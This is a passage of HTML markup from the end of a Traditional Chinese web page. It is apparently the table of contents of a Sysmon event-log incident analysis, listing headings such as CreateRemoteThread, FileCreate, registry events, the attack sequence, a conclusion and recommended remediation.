href=#事件識別碼-8createremotethread>事件識別碼 8：CreateRemoteThread</a></li><li><a href=#事件識別碼-11filecreate>事件識別碼 11：FileCreate</a></li><li><a href=#事件識別碼-13registryevent-值已設定>事件識別碼 13：RegistryEvent (值已設定)</a></li></ul></li><li><a href=#recon---event-log呈現的攻擊順序>Recon - Event Log呈現的攻擊順序</a></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#建議處理措施>建議處理措施</a></li></ul></nav></div></aside></main></body></html>